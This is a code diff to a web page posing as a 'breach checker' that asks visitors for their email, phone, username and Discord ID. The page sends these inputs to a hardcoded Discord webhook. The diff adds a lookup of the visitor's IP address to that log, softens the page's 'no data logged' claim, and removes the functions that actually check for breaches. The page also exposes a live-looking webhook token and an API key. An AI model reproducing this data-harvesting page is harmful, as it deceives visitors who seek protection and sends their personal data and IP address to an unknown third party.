@@ -153,10 +153,13 @@
     <span style="margin-left: 8px;">Join our Discord</span>
   </a>
 
-  <div class="note">Powered by public breach APIs. No data is stored or logged.</div>
+  <div class="note">Powered by public breach APIs. No data is stored or logged without your consent.</div>
 
   <script>
     async function checkAllBreaches() {
+      const confirmed = confirm("🔒 This tool will log your inputs (email, phone, etc.) and your IP address for moderation and audit purposes.\n\nDo you consent to continue?");
+      if (!confirmed) return;
+
       const email = document.getElementById('emailInput').value.trim();
       const phone = document.getElementById('phoneInput').value.trim();
       const username = document.getElementById('usernameInput').value.trim();
@@ -197,6 +200,15 @@
     async function sendWebhookLog(email, phone, username, discord) {
       const webhookUrl = "https://discord.com/api/webhooks/1380767678012330036/MblAmzSvQAY_ahZmsl-U9iCK8uUX0cbGmdiZjy19v27NuW4jo1BKZ1cPr7BMp_gziEHU";
 
+      let ip = "Unavailable";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch (e) {
+        console.warn("IP fetch failed:", e);
+      }
+
       const payload = {
         username: "Breach Checker Log",
         avatar_url: "https://cdn.discordapp.com/embed/avatars/4.png",
@@ -208,6 +220,7 @@
             { name: "📱 Phone", value: phone || "Not provided", inline: false },
             { name: "👤 Username", value: username || "Not provided", inline: false },
             { name: "💬 Discord ID", value: discord || "Not provided", inline: false },
+            { name: "🌐 IP Address", value: ip, inline: false },
             { name: "🕒 Time", value: new Date().toUTCString(), inline: false }
           ]
         }]
@@ -223,93 +236,6 @@
         });
       } catch (e) {
         console.error("Webhook error:", e);
-      }
-    }
-
-    async function checkEmailBreaches(email) {
-      let results = [];
-      let foundSomething = false;
-
-      try {
-        const res = await fetch(`https://api.xposedornot.com/v1/check-email/${encodeURIComponent(email)}`);
-        const data = await res.json();
-        if (data && data.breaches?.length) {
-          foundSomething = true;
-          results.push(`❌ Found in: ${data.breaches.map(b => b.name).join(', ')}`);
-        } else {
-          results.push('✅ No breaches found in first source.');
-        }
-      } catch (e) {}
-
-      if (!foundSomething) {
-        results.unshift(`🔥 ${email} got OPSEC fire. No public breaches detected.`);
-      }
-
-      document.getElementById('emailResults').textContent = results.join("\n\n");
-    }
-
-    async function checkPhoneBreaches(phone) {
-      try {
-        const res = await fetch(`https://phonevalidation.abstractapi.com/v1/?api_key=dc82e3f927a54d6d9421c82ebc02ad82&phone=${encodeURIComponent(phone)}`);
-        const data = await res.json();
-
-        if (data.valid) {
-          document.getElementById('phoneResults').textContent = `📱 Number valid.\nCountry: ${data.country.name}\nLine Type: ${data.line_type}`;
-        } else {
-          document.getElementById('phoneResults').textContent = '❌ Invalid phone number.';
-        }
-      } catch (e) {
-        document.getElementById('phoneResults').textContent = '⚠️ Phone API error or limit reached.';
-      }
-    }
-
-    async function checkUsernameBreaches(username) {
-      let results = [];
-      results.push('⚠️ Username breach check temporarily disabled.');
-      document.getElementById('usernameResults').textContent = results.join("\n\n");
-    }
-
-    async function checkDiscordBreaches(discord) {
-      document.getElementById('discordResults').innerHTML = '🔍 Checking public breach dumps and Discord info...';
-
-      try {
-        const res = await fetch(`https://discord.com/api/v10/users/${discord}`, {
-          headers: {
-            Authorization: `Bot YOUR_BOT_TOKEN_HERE`
-          }
-        });
-
-        if (res.ok) {
-          const data = await res.json();
-
-          const avatarUrl = data.avatar
-            ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png`
-            : 'https://cdn.discordapp.com/embed/avatars/0.png';
-
-          const createdAt = new Date((BigInt(discord) >> 22n) + 1420070400000n);
-          const createdAtStr = createdAt.toUTCString();
-
-          document.getElementById('discordResults').innerHTML = `
-            <div style="display:flex; align-items:center; gap:16px;">
-              <img src="${avatarUrl}" alt="Avatar" width="64" height="64" style="border-radius:50%; border:2px solid #5865F2;">
-              <div>
-                <strong>${data.username}#${data.discriminator || data.global_name || ''}</strong><br>
-                ID: ${data.id}<br>
-                Created: ${createdAtStr}
-              </div>
-            </div>
-          `;
-        } else {
-          document.getElementById('discordResults').innerHTML = `
-            ❌ User not found or IP not found.<br>
-            (Note: Discord API requires bot permissions.)
-          `;
-        }
-      } catch (e) {
-        document.getElementById('discordResults').innerHTML = `
-          ⚠️ Error checking Discord ID.<br>
-          Possibly IP not found / API blocked.
-        `;
       }
     }
   </script>
